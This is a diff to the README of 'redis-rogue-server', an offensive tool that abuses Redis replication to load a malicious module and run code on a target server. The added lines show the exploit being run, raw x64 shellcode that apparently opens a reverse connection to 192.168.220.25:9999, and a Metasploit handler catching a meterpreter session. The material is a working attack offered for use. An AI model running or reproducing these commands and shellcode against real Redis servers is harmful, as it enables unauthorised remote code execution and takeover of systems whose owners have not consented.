@@ -15,11 +15,10 @@ If you want to modify or recompile the redis module, you also require `make`.
 Compile exploit:
 
 ``` bash
-cd RedisModulesSDK/exp/
 make
 ```
 
-Copy the .so file to same folder with `redis-rogue-server.py`.
+it will product a module.so file
 
 ```
 ➜ ./redis-rogue-server.py -h
@@ -116,4 +115,42 @@ n0b0dy
 ```
 
 ### shellcode
+λ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 --exp=module.so
+______         _ _      ______                         _____                          
+| ___ \       | (_)     | ___ \                       /  ___|                         
+| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
+|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
+| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
+\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
+                                     __/ |                                            
+                                    |___/                                             
+@copyright n0b0dy @ r3kapig
 
+[info] TARGET 127.0.0.1:6379
+[info] SERVER 127.0.0.1:21000
+[info] Setting master...
+[info] Setting dbfilename...
+[info] Loading module...
+[info] Temerory cleaning up...
+What do u want, [i]nteractive shell or [r]everse shell or [s]hellcode: s
+shellcode: \x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x52\x6a\x0a\x41\x59\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x27\x0f\xc0\xa8\xdc\x19\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x5a\x0f\x05\x48\x85\xc0\x78\xef\xff\xe6
+[info] shellcode sent.
+[info] Unload module...
+
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 192.168.220.25
+lhost => 192.168.220.25
+msf5 exploit(multi/handler) > set lport 9999
+lport => 9999
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.220.25:9999 
+[*] Sending stage (3021284 bytes) to 192.168.220.25
+[*] Meterpreter session 1 opened (192.168.220.25:9999 -> 192.168.220.25:52246) at 2019-07-12 15:12:37 +0800
+
+meterpreter > exit
+
+enjoy yourself!
